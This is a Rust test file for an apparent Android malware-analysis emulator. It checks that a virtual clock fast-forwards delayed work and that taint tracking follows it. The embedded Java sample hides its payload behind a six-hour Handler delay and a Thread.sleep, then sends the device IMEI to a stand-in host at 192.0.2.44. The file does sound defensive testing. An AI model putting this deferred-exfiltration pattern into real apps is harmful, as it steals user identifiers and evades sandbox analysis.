//! Asynchronous behaviour: a sample that defers its payload behind a Handler or
//! Thread.sleep. The virtual clock must run the work without wall-clock delay,
//! and the finding must still carry the chain back through the callback.

mod support;

use std::sync::Arc;

use support::packed::compile_sources_to_dex;
use unshroud::dex::DexFile;
use unshroud::scenario::{self, RunConfig};
use unshroud::vm::env::Persona;
use unshroud::vm::registry::Registry;

const SOURCE: &str = r#"
package com.example.delay;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;

public class Deferred {
    static Context sCtx;
    public static void attach(Context ctx) {
        sCtx = ctx;
        // Two classic delays: a Handler post, and a plain sleep.
        Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            public void run() { fetch("handler"); }
        }, 6L * 60 * 60 * 1000);   // six hours
        Thread t = new Thread(new Runnable() {
            public void run() {
                try { Thread.sleep(120000); } catch (InterruptedException e) {}
                fetch("sleep");
            }
        });
        t.start();
    }
    static void fetch(String tag) {
        try {
            String id = ((android.telephony.TelephonyManager)
                sCtx.getSystemService("phone")).getDeviceId();
            java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL("http://192.0.2.44/" + tag + "?id=" + id).openConnection();
            c.connect();
        } catch (Throwable th) { }
    }
}
"#;

#[test]
fn delayed_payload_runs_on_the_virtual_clock() {
    let Some(dex) = compile_sources_to_dex(&[("Deferred", SOURCE)]) else {
        eprintln!("skipping: no d8/javac");
        return;
    };
    let mut reg = Registry::new();
    reg.add_image(Arc::new(DexFile::parse("classes.dex", dex).unwrap()), false);
    let cfg = RunConfig { step_limit: 20_000_000, per_scenario_ms: 30_000, max_scenarios: 1, ..Default::default() };
    let t0 = std::time::Instant::now();
    let out = scenario::run(reg, vec![Persona::retail_default()], &cfg);
    let wall = t0.elapsed();
    assert!(wall.as_secs() < 10, "six virtual hours must not cost six real hours; took {wall:?}");

    let sc = &out.scenarios[0];
    let urls: Vec<&str> = sc.findings.iter().map(|f| f.detail.as_str()).collect();
    assert!(urls.iter().any(|u| u.contains("192.0.2.44/handler")),
        "handler-delayed fetch should run; saw {urls:?}");
    assert!(urls.iter().any(|u| u.contains("192.0.2.44/sleep")),
        "sleep-delayed fetch should run; saw {urls:?}");

    // The chain should attribute the handler fetch to the Runnable's run().
    let f = sc.findings.iter().find(|f| f.detail.contains("/handler")).unwrap();
    assert!(f.stack.iter().any(|s| s.contains("run")), "chain: {:?}", f.stack);
    assert!(f.taint.iter().any(|t| t == "imei"));
}
